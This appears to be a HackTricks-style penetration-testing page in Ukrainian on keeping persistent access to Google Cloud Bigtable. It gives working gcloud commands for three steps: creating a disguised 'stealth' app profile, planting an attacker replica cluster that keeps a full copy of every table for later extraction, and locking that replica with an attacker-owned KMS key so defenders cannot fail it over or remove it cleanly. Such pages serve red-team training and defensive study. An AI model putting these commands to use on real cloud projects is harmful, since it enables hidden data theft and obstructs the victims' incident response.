# GCP - Bigtable Збереження доступу

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Для отримання додаткової інформації про Bigtable дивіться:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Dedicated attacker App Profile

**Дозволи:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Створіть app profile, який направлятиме трафік до вашого replica cluster і увімкніть Data Boost, щоб ви ніколи не залежали від provisioned nodes, які захисники можуть помітити.

<details>

<summary>Створіть stealth app profile</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Поки цей профіль існує, ви можете повторно підключитися за допомогою нових облікових даних, які посилаються на нього.

### Підтримуйте власний кластер-репліку

**Дозволи:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Розгорніть кластер з мінімальною кількістю вузлів у спокійному регіоні. Навіть якщо ваші клієнтські ідентичності зникнуть, **кластер зберігає повну копію кожної таблиці** доти, поки захисники явно не видалять її.

<details>

<summary>Створити репліку кластера</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Слідкуйте за ним через `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` щоб ви могли масштабуватися миттєво, коли потрібно витягти дані.

### Заблокуйте реплікацію за допомогою власного CMEK

**Права:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` на ключі, що належить атакуючому.

Використовуйте власний KMS-ключ при запуску клону. Без цього ключа Google не зможе створити кластер заново або виконати fail over для кластера, тож blue teams повинні координуватися з вами перед втручанням.

<details>

<summary>Створити кластер, захищений CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Проведіть ротацію або відключіть key у вашому проекті, щоб миттєво вивести replica з ладу (залишивши при цьому можливість пізніше знову його ввімкнути).

{{#include ../../../banners/hacktricks-training.md}}
